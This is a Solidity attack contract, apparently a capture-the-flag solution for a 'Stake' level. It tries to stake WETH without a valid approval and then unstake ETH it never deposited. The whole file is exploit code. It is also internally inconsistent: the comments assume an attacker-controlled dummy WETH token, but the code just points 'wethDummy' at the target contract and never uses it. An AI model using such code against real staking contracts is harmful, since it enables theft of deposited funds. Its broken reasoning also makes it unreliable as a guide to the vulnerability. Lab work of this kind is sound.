pragma solidity ^0.8.0;

import "../levels/Stake.sol";


contract Attack {

    address payable private stakeInstance;

    address private wethDummy;


    constructor(address payable _stakeInstance) {
        stakeInstance = _stakeInstance;
        wethDummy = _stakeInstance;
    }

    // Simulate WETH allowance check and stake without actual WETH transfer
    function exploit() public {
        // Call stakeWETH without valid WETH approval but with dummy approval
        // This assumes that dummy WETH address is controlled to return high allowance
        (bool success, ) = stakeInstance.call(
            abi.encodeWithSelector(bytes4(keccak256(abi.encodePacked("StakeWETH(uint256)"))), 1 ether)
        );
        require(success);

        // Call Unstake to withdraw ETH without depositing it (due to earlier flaw)
        (success, ) = stakeInstance.call(
            abi.encodeWithSelector(bytes4(keccak256(abi.encodePacked("Unstake(uint256)"))), 1 ether)
        );
    }

}